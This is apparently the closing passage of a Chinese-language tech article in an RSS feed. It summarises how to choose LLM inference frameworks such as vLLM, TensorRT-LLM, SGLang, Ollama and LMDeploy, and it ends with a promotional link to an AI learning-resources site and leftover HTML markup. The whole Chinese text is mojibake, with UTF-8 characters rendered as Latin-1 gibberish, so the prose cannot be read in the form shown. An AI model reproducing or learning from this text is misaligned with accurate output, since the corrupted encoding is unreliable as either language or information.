<p>å¤§æ¨¡å‹æ¨ç†éƒ¨ç½²æ¡†æ¶çš„é€‰å‹éœ€ç»¼åˆè€ƒé‡ä¸šåŠ¡åœºæ™¯ã€ç¡¬ä»¶æ¡ä»¶ä¸é•¿æœŸæ¼”è¿›è·¯å¾„ã€‚åœ¨ä¼ä¸šçº§é«˜å¹¶å‘éœ€æ±‚ä¸‹ï¼ŒvLLMä¸TensorRT-LLMå…·å¤‡æœ€ä¼˜æ€§èƒ½ï¼›SGLangåˆ™åœ¨é«˜ååä¸å¤šè½®äº¤äº’åœºæ™¯ä¸­ä¼˜åŠ¿çªå‡ºï¼›Ollamaé€‚ç”¨äºä¸ªäººå¼€å‘ä¸æ•æ·åŸå‹éªŒè¯ï¼›XInferenceå’ŒLightLLMåœ¨åˆ†å¸ƒå¼æ¶æ„ä¸è¾¹ç¼˜ç«¯éƒ¨ç½²ä¸­å±•ç°å‡ºå¹¿é˜”å‰æ™¯ï¼›LMDeployä¸æ˜‡è…¾æ¡†æ¶åˆ™åœ¨å›½äº§åŒ–ç¡¬ä»¶ç”Ÿæ€é€‚é…æ–¹é¢å…·æœ‰ä¸å¯æ›¿ä»£æ€§ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer"><strong>æ›´å¤šAIå¤§æ¨¡å‹å­¦ä¹ è§†é¢‘åŠèµ„æºï¼Œéƒ½åœ¨æ™ºæ³ŠAIã€‚</strong></a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>